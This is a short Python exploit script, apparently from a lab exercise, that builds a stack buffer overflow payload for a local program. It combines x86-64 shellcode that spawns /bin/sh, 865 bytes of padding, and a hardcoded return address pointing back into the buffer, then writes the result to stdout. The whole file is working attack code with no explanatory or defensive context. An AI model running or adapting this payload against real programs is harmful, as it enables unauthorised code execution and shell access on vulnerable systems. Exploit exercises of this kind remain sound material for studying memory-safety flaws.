import struct
import sys

# Setting the padding size
padding_size = 865

# Shell code to inject at the starting of the buffer 
shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# Address of the starting of the buffer (outside gdb - Obtained the shift in addresses from the coredump file)
buffer_starting_addr = 0x00007fffffffdca0
# Packing the starting address of the buffer
buffer_starting_addr_packed = struct.pack("<q",buffer_starting_addr)

#----------------------------
# Creating the payload
#----------------------------
payload = shell_code + b'A'*padding_size
payload += buffer_starting_addr_packed
sys.stdout.buffer.write(payload)
